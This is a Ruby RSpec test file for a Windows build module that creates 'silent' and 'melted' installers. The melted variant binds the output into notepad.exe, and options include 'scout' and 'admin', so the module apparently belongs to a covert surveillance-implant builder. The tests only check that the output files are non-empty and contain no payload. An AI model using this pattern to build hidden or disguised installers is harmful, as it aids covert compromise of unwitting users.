require_relative 'shared'

# Note: signtool.exe should be executed with administrative privileges

module RCS::DB
  describe BuildWindows, build: true do

    shared_spec_for(:windows, melt: 'notepad.exe')

    before(:all) do
      RCS::DB::Config.instance.load_from_file
    end

    describe 'windows builder' do
      before do
        limits = {magic: 'LOuWAplu'}
        LicenseManager.instance.stub(:limits).and_return(limits)
      end

      it "should create the silent installer" do
        params = {
          'factory' => {'_id' => @factory.id},
          'binary'  => {'demo' => false},
          'melt'    => {},
          'package' => {}
        }

        subject.create(params)
        subject.outputs.each { |name| expect(File.size(subject.path(name))).not_to eql(0) }
      end

      ["cooked", "admin", "bit64", "codec", "scout"].each do |val|
        it "should create the silent installer with #{val} = true" do
          params = {
            'factory' => {'_id' => @factory.id},
            'binary'  => {'demo' => false},
            'melt'    => {"#{val}" => true},
            'package' => {}
          }

          subject.create(params)
          subject.outputs.each { |name| expect(File.size(subject.path(name))).not_to eql(0) }
        end
      end

      it 'should create the melted installer' do
        params = {
          'factory' => {'_id' => @factory.id},
          'binary'  => {'demo' => false},
          'melt'    => {'input' => melt_file},
          'package' => {}
        }

        subject.create(params)
        subject.outputs.each { |name| expect(File.size(subject.path(name))).not_to eql(0) }
      end
    end
  end
end
